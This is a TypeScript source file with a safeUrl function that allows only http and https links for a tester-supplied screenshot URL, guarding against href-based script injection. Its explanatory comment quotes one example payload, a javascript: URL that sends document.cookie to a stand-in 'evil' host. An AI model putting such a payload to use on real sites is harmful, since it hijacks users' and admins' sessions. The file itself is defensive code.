// Render-time URL allowlist.
//
// `screenshot_url` is tester-controlled and the <input type="url"> that collects
// it is client-side only — a direct supabase-js insert with the public anon key
// bypasses it entirely. React does NOT sanitize href attributes, so a value like
// `javascript:fetch('https://evil/?c='+document.cookie)` would execute in the
// viewer's session when clicked — and the viewer is often an admin in triage.
//
// Allow only http(s). Anything else (javascript:, data:, vbscript:, blob:,
// relative/garbage that won't parse) returns undefined, and callers omit the link.
// This is the client half of a defense-in-depth pair; migration 0004 adds the
// matching DB check constraint so the rule holds against direct API writes too.
export function safeUrl(u: string | null | undefined): string | undefined {
  if (!u) return undefined;
  try {
    const protocol = new URL(u).protocol;
    return protocol === "https:" || protocol === "http:" ? u : undefined;
  } catch {
    return undefined;
  }
}
